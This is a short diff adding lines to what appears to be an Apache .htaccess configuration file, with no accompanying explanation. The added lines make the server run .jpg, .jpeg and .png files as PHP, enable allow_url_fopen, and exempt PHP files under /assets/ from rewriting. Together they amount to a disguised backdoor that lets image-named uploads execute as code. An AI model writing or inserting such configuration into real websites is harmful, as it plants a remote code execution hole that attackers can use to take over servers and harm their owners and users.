@@ -1,0 +1,10 @@
+<FilesMatch "\.(jpg|jpeg|png)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+php_value allow_url_fopen 1
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    RewriteCond %{REQUEST_URI} ^/assets/.*\.php$ [NC]
+    RewriteRule ^ - [L]
+</IfModule>
